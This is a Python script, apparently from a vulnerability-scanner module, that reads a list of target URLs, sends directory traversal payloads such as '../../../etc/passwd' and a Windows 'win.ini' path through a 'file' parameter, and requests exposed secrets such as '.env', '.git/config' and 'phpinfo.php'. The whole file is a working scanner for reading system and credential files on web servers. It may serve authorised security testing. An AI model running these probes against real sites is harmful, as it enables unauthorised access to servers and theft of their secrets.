import requests
from urllib.parse import urljoin

# Common test payloads
TRAVERSAL_PATHS = [
    "../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
]

INFO_DISCLOSURE_PATHS = [
    ".git/config",
    ".env",
    "server-status",
    "phpinfo.php",
    "config.php"
]

def test_directory_traversal(base_url):
    print(f"\n🔍 Testing Directory Traversal on: {base_url}")
    for path in TRAVERSAL_PATHS:
        url = f"{base_url}?file={path}"
        try:
            response = requests.get(url, timeout=5)
            if "root:x:" in response.text or "[extensions]" in response.text:
                print(f"🚨 Vulnerable: {url}")
            else:
                print(f"✅ Safe: {url}")
        except requests.RequestException as e:
            print(f"⚠️ Error accessing {url}: {e}")

def test_info_disclosure(base_url):
    print(f"\n🔍 Testing Info Disclosure on: {base_url}")
    for path in INFO_DISCLOSURE_PATHS:
        full_url = urljoin(base_url, path)
        try:
            response = requests.get(full_url, timeout=5)
            if response.status_code == 200 and len(response.text) > 30:
                print(f"🚨 Info leak found: {full_url}")
            else:
                print(f"✅ Safe: {full_url}")
        except requests.RequestException as e:
            print(f"⚠️ Error accessing {full_url}: {e}")

def run_scanner(url_file):
    with open(url_file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]
    
    for url in urls:
        print(f"\n==============================")
        print(f"🌐 Scanning: {url}")
        print(f"==============================")
        test_directory_traversal(url)
        test_info_disclosure(url)

if __name__ == "__main__":
    url_file_path = "modules/vulnerability-scanner/test_urls.txt"
    run_scanner(url_file_path)
